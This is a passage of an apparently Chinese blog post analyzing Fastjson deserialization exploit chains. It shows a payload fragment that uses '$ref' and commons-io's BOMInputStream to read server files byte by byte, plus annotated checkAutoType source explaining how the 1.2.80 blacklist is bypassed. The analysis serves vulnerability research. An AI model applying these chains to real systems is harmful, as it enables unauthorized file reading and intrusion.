class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">66</span><span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload分析：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>此处使用FastJSON特性，”$ref””: “$.xx.yy”表示调用JSON对象中xx的yy属性。payload中即调用abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的getBOM()方法。</p><p>org.apache.commons.io.input.BOMInputStream类分析</p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 传入InputStream 类型的 delegate 和 ByteOrderMark 数组 boms</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(InputStream delegate, <span class="hljs-type">boolean</span> include, ByteOrderMark... boms)</span><br></code></pre></td></tr></table></figure><p>getBOM()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteOrderMark <span class="hljs-title function_">getBOM</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">maxBomSize</span> <span class="hljs-operator">=</span> ((ByteOrderMark)<span class="hljs-built_in">this</span>.boms.get(<span class="hljs-number">0</span>)).length();<br>            <span class="hljs-built_in">this</span>.firstBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[maxBomSize];        <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.firstBytes.length; ++i) &#123;<br>            <span class="hljs-built_in">this</span>.firstBytes[i] = <span class="hljs-built_in">this</span>.in.read(); <span class="hljs-comment">// 从 delegate 输入流从取出所有字节，组成一个 int 数组</span><br>            ++<span class="hljs-built_in">this</span>.fbLength;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes[i] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.byteOrderMark = <span class="hljs-built_in">this</span>.find(); <span class="hljs-comment">// 开始把实例化对象时传入的 ByteOrderMark 数组 boms 和从 delegate 输入流从取出所有字节组成的int数组进行比对。</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.include) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark.length() &lt; <span class="hljs-built_in">this</span>.firstBytes.length) &#123;<br>                <span class="hljs-built_in">this</span>.fbIndex = <span class="hljs-built_in">this</span>.byteOrderMark.length();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.byteOrderMark; <span class="hljs-comment">//返回 byteOrderMark</span><br>&#125;<br><span class="hljs-keyword">private</span> ByteOrderMark <span class="hljs-title function_">find</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.boms.iterator();<br><br>    ByteOrderMark bom;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!var1.hasNext()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        bom = (ByteOrderMark)var1.next();<br>    &#125; <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">this</span>.matches(bom));<br><br>    <span class="hljs-keyword">return</span> bom;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(ByteOrderMark bom)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bom.length(); ++i) &#123;<br>        <span class="hljs-keyword">if</span> (bom.get(i) != <span class="hljs-built_in">this</span>.firstBytes[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此处代码逻辑为将delegate 输入流的字节码转成 int 数组，然后用 ByteOrderMark 中的 bytes 挨个字节遍历进行比对，如果遍历过程有比对错误的 getBom 就会返回一个 null，如果遍历结束，没有比对错误那就会返回一个 ByteOrderMark 对象。所以此处文件读取成功的标志为 getBom 返回结果不为 null。故文件读取原理为字节码对比，通过遍历对比目标文件中字节码从而挨个字节获取文件内容，类似SQL盲注。</p><p>org.apache.commons.io.input.ReaderInputStream类分析：</p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReaderInputStream</span><span class="hljs-params">(Reader reader, CharsetEncoder encoder, <span class="hljs-type">int</span> bufferSize)</span><br></code></pre></td></tr></table></figure><p>jdk.nashorn.api.scripting.URLReader类分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url)</span><br></code></pre></td></tr></table></figure><p>此处传入URL,则此处可使用file jar http 等协议</p><h3 id="91-2-72-Fastjson"><a href="#91-2-72-Fastjson" class="headerlink" title="91.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a>91.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</h3><h4 id="利用链分析：-9"><a href="#利用链分析：-9" class="headerlink" title="利用链分析："></a>利用链分析：</h4><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p><p>ParserConfig#checkAutoType()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//若safeMode为true进入，不反序列化所有类</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类为空</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//期望类不为空</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">expectHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());<br>                <span class="hljs-keyword">if</span> (expectHash != -<span class="hljs-number">8024746738719829346L</span> &amp;&amp; expectHash != <span class="hljs-number">3247277300971823414L</span> &amp;&amp; expectHash != -<span class="hljs-number">5811778396720452501L</span> &amp;&amp; expectHash != -<span class="hljs-number">1368967840069965882L</span> &amp;&amp; expectHash != <span class="hljs-number">2980334044947851925L</span> &amp;&amp; expectHash != <span class="hljs-number">5183404141909004468L</span> &amp;&amp; expectHash != <span class="hljs-number">7222019943667248779L</span> &amp;&amp; expectHash != -<span class="hljs-number">2027296626235911549L</span> &amp;&amp; expectHash != -<span class="hljs-number">2114196234051346931L</span> &amp;&amp; expectHash != -<span class="hljs-number">2939497380989775398L</span>) &#123;<br>                    expectClassFlag = <span class="hljs-literal">true</span>;<span class="hljs-comment">//期望类不为空且不在黑名单中</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    expectClassFlag = <span class="hljs-literal">false</span>;<span class="hljs-comment">//期望类在黑名单中</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//黑名单校验</span><br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">////!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<span class="hljs-comment">//白名单校验，若在白名单中则返回类</span><br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//从map中获取类</span><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类不为空切目标类不为HashMap、LinkedHashMap且目标类不继承至期望类则抛出异常</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; clazz != LinkedHashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//以下与1.2.68基本一致</span><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                                    <span class="hljs-keyword">return</span> expectClass;<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var24) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            